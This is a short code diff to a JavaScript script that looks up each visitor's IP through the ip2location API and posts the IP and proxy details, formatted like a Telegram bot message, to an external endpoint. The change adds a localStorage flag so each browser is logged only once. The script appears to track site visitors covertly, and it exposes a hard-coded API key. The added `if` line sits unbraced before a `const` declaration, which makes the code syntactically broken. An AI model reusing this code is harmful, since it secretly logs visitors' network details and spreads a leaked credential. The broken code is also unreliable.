@@ -129,7 +129,7 @@ fetch('https://api.ip2location.io/?key=845094BBD7FCAE829B7D6AF3AE13FC02&ip=' + i
     let isProxyType = data.proxy && data.proxy.proxy_type;
     let isWebProxy = data.proxy && data.proxy.is_web_proxy;
       
-    
+if (!localStorage.getItem('logSent'))
         const message = `
 *🔎 ip*
 *├ IP: ${ip}*
@@ -189,6 +189,8 @@ fetch('https://api.ip2location.io/?key=845094BBD7FCAE829B7D6AF3AE13FC02&ip=' + i
         fetch(url, {
             method: 'POST',
             body: formData
+            }).then(() => {
+            localStorage.setItem('logSent', true);
         });
       });
     });
